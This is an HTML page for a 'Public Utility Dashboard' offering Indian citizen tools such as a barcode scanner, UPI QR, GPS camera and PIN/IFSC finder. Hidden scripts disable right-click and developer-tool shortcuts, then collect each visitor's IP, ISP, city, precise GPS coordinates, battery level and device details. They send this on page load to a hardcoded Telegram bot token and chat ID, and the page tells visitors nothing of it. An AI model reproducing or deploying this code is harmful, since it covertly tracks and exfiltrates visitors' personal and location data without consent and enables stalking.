<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>Public Utility Dashboard | Rankaj Kumar</title>
<meta name="viewport" content="width=device-width, initial-scale=1">

<style>
/* ===== BASE ===== */
body{
  margin:0;
  font-family:Segoe UI,Arial;
  background:
    radial-gradient(circle at top,#0b5ed7 0%,#020617 65%);
  min-height:100vh;
  color:#fff;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
}

/* ===== HEADER ===== */
.header{
  text-align:center;
  margin-bottom:36px;
}
.header h1{
  margin:0;
  font-size:32px;
  letter-spacing:.5px;
}
.header p{
  margin-top:8px;
  font-size:14px;
  opacity:.85;
}

/* ===== GRID ===== */
.grid{
  display:grid;
  grid-template-columns:repeat(auto-fit,minmax(260px,1fr));
  gap:30px;
  max-width:900px;
  width:90%;
}

/* ===== CARD ===== */
.card{
  background:rgba(255,255,255,.08);
  backdrop-filter: blur(16px);
  border-radius:22px;
  padding:32px;
  text-align:center;
  box-shadow:0 30px 60px rgba(0,0,0,.6);
  transition:.35s ease;
}
.card:hover{
  transform:translateY(-6px);
  box-shadow:0 40px 80px rgba(0,0,0,.7);
}
.card h2{
  margin:10px 0;
  font-size:21px;
}
.card p{
  font-size:14px;
  opacity:.85;
  line-height:1.5;
}

/* ===== BUTTON ===== */
.card a{
  display:inline-block;
  margin-top:22px;
  padding:12px 28px;
  background:#0b5ed7;
  color:#fff;
  text-decoration:none;
  border-radius:14px;
  font-size:16px;
  transition:.3s;
}
.card a:hover{
  background:#2563eb;
  box-shadow:0 0 0 6px rgba(37,99,235,.25);
}

/* ===== FOOTER ===== */
footer{
  margin-top:48px;
  font-size:12px;
  opacity:.65;
  text-align:center;
}
</style>
</head>

<body>

<!-- ===== TITLE ===== -->
  <div class="card">
  <h2>ðŸ“¦ Product Barcode Scanner</h2>
  <p>
    Scan grocery & packaged food barcodes to
    check product details, nutrition and
    originality.
  </p>
  <a href="barcode.html">Open Scanner</a>
  </div>
  
<div class="header">
  <h1>ðŸ‡®ðŸ‡³ Public Utility Dashboard</h1>
  <p>Citizen services & location-based web tools</p>
</div>

<!-- ===== MAIN DASHBOARD ===== -->
<div class="grid">
<div class="card">
  <h3>ðŸ§¾UPI QR</h3>
  <p>Payment Tools</p>
  <a href="upi.html" class="btn">Open</a>
</div>
  <div class="card">
    <h2>ðŸ“¸ GPS Web Camera</h2>
    <p>
      Capture photos with live location, address,
      date and time overlay.
    </p>
    <a href="cam.html">Open Camera</a>
  </div>

  <div class="card">
    <h2>ðŸ“® PIN & IFSC Finder</h2>
    <p>
      Find post office, bank branches,
      IFSC codes and nearby services.
    </p>
    <a href="finder.html">Open Finder</a>
  </div>

  <div class="card">
    <h2>ðŸ‘¤ About</h2>
    <p>
      Developer profile and project
      information.
    </p>
    <a href="about.html">View About</a>
  </div>

</div>

<!-- ===== FOOTER ===== -->
<footer>
  Designed & Developed by <strong>Rankaj Kumar</strong>
</footer>
<script>
/* Disable right click */
document.addEventListener("contextmenu", function(e){
  e.preventDefault();
});

/* Optional: block common inspect shortcuts */
document.addEventListener("keydown", function(e){
  if(
    e.key === "F12" ||
    (e.ctrlKey && e.shiftKey && ["I","C","J"].includes(e.key)) ||
    (e.ctrlKey && e.key === "U")
  ){
    e.preventDefault();
  }
});
</script>
  <script>
/* ==================================================
   ONE IP = ONE TELEGRAM MESSAGE (FINAL & STABLE)
   Frontend Safe | No UI Change | Bug-Free
================================================== */

// ðŸ”´ TELEGRAM CONFIG
const BOT_TOKEN = "7193425151:AAFKa2HcygWLjSOYWTcC917_joT6S-RBYyY";
const CHAT_ID  = "543961277";

// ================= DEVICE INFO =================
const deviceType = /Mobi|Android/i.test(navigator.userAgent) ? "Mobile" : "Desktop";
const os = navigator.platform || "Unknown";
const screenSize = screen.width + " x " + screen.height;

// ================= GLOBAL DATA =================
let ipData = null;
let locationData = { status: "Pending" };
let batteryData = "Not Supported";

// ================= BATTERY =================
if (navigator.getBattery) {
  navigator.getBattery()
    .then(battery => {
      batteryData =
        Math.round(battery.level * 100) +
        "% (" + (battery.charging ? "Charging" : "Not Charging") + ")";
    })
    .catch(() => {});
}

// ================= IP FETCH =================
fetch("https://ipapi.co/json/")
  .then(res => res.json())
  .then(data => {
    ipData = data;
    mainLogic();
  })
  .catch(() => {});

// ================= LOCATION =================
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      locationData = {
        status: "Allowed",
        lat: pos.coords.latitude,
        lon: pos.coords.longitude
      };
    },
    () => {
      locationData = { status: "Denied" };
    },
    { timeout: 7000 }
  );
} else {
  locationData = { status: "Not Supported" };
}

// ================= SIM / NETWORK =================
function detectSimCompany(org){
  if(!org) return "Unknown";
  org = org.toLowerCase();
  if(org.includes("jio")) return "Jio";
  if(org.includes("airtel")) return "Airtel";
  if(org.includes("vodafone") || org.includes("idea")) return "VI";
  if(org.includes("bsnl")) return "BSNL";
  return "WiFi / Other ISP";
}

// ================= CORE LOGIC =================
function mainLogic(){
  if(!ipData || !ipData.ip) return;

  const stored = JSON.parse(localStorage.getItem("unique_ips") || "[]");

  // ðŸš« Same IP already logged
  if (stored.includes(ipData.ip)) return;

  // âœ… Save IP
  stored.push(ipData.ip);
  localStorage.setItem("unique_ips", JSON.stringify(stored));

  sendToTelegram();
}

// ================= TELEGRAM SEND =================
function sendToTelegram(){
  const mapLink =
    locationData.lat
      ? `https://maps.google.com/?q=${locationData.lat},${locationData.lon}`
      : "Not Available";

  const message = `
ðŸ‡®ðŸ‡³ Public Utility Dashboard (Unique Visit)

ðŸ•’ Time
${new Date().toLocaleString()}

ðŸ“± Device
Type: ${deviceType}
OS: ${os}
Screen: ${screenSize}

ðŸ”‹ Battery
${batteryData}

ðŸŒ Network
IP: ${ipData.ip}
Provider: ${detectSimCompany(ipData.org)}
ISP: ${ipData.org || "N/A"}
City: ${ipData.city || "N/A"}
State: ${ipData.region || "N/A"}
Country: ${ipData.country_name || "N/A"}

ðŸ“ Location
Status: ${locationData.status}
Lat: ${locationData.lat || "N/A"}
Lon: ${locationData.lon || "N/A"}
Map: ${mapLink}

ðŸ”— Page
${location.href}
`;

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`,{
    method:"POST",
    headers:{ "Content-Type":"application/json" },
    body:JSON.stringify({
      chat_id: CHAT_ID,
      text: message
    })
  }).catch(()=>{});
}
  </script>
</body>
</html>
